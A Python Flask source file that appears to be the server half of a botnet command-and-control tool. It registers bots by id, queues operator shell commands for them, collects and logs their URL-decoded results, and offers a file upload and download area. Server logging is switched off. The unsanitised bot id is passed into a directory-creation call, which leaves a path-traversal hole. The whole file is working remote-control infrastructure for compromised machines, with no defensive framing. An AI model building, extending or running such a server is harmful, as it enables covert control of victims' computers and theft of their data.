from flask import Flask, flash, request, redirect, url_for, Response, app
from flask_autoindex import AutoIndex
from werkzeug.utils import secure_filename
from bots import setup, Bot
from shell import App
import threading
import os
import logging
import urllib.parse
import datetime

# cmd shell
shell = App()

# server
app = Flask(__name__)
app.logger.disabled = True
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

def flaskThread():
    app.run()


# directory listing - serving files
AutoIndex(app, './dir')

# uploads function
UPLOAD_FOLDER = './dir/uploads'
EXTENSIONS = set(['txt', 'pdf', 'png', 'jpg', 'jpeg'])
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER


# Route to get id , sendCommand and get result
# parameter id (bot.id - bot name and folder)
# parameter r (bot response)
@app.route('/cmd')
def getId():
    path = './bots/'
    id = request.args.get('id')
    bot = setup.devices.get(str(id))

    if not bot:
        os.makedirs(path + id)
        setup.devices.update({id: Bot(True, '<p></p>')})
        shell.async_alert('\033[94m' + 'New bot: ' + id + '\033[0m')
        return Response("<p></p>", mimetype='text/plain')
    if request.args.get('r'):
        bot.response += request.args.get('r')
    if not request.args.get('r') and bot.response != '':
        f = open(path + request.args.get('id') + "/log.txt", "a+")
        date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        if bot.response != '<p></p>':
            f.write(date + '[ raw  result] >> ' + bot.response + '\n')
            f.write(date + '[decoded result] >> ' + urllib.parse.unquote(bot.response) + '\n')
        bot.response = '<p></p>'

    cmd_to_bot = bot.command
    bot.update('<p></p>')
    setup.devices.update({id: bot})
    return Response(cmd_to_bot, mimetype='text/plain')


def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in EXTENSIONS


@app.route('/upload', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        if 'file' not in request.files:
            flash('No file part')
            return redirect(request.url)
        file = request.files['file']
        if file.filename == '':
            flash('No selected file')
            return redirect(request.url)
        if file and allowed_file(file.filename):
            filename = secure_filename(file.filename)
            file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
            return Response('Success', mimetype='text/plain')
    return '''
    <!doctype html>
    <title>Upload new File</title>
    <h1>Upload new File</h1>
    <form method=post enctype=multipart/form-data>
      <input type=file name=file>
      <input type=submit value=Upload>
    </form>
    '''


if __name__ == '__main__':
    threading.Thread(target=flaskThread).start()
    shell.cmdloop()
